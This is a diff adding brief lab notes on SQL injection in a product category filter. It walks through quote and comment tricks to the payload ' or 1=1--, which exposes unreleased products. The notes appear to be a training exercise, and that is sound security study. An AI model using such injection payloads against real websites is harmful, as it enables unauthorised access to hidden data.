@@ -1,0 +1,19 @@
+##SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+
+SQL injection - product categry filter 
+
+SELECT * FROM products WHERE categroy = 'Gifts' AND released = 1
+
+-> End goal: display all products both released and unreleased
+
+Analysis:
+
+SELECT * FROM products WHERE categroy = 'Gifts' AND released = 1
+
+SELECT * FROM products WHERE categroy = ''' AND released = 1
+
+SELECT * FROM products WHERE categroy = ''--' AND released = 1
+
+SELECT * FROM products WHERE categroy = ''
+
+answer-> SELECT * FROM products WHERE categroy = '' or 1=1--' AND released = 1
